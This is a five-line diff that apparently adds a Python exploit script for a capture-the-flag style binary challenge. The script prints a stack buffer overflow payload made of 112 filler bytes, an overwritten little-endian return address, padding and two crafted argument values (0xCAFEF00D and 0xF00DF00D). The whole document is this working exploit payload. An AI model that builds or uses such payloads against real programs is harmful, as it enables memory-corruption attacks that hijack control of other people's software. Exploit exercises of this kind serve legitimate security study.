@@ -1,0 +1,5 @@
+print(b"A"*112
+    + b"\x96\x92\x04\x08"
+    + b"B"*4
+    + b"\x0D\xF0\xFE\xCA"
+    + b"\x0D\xF0\x0D\xF0")
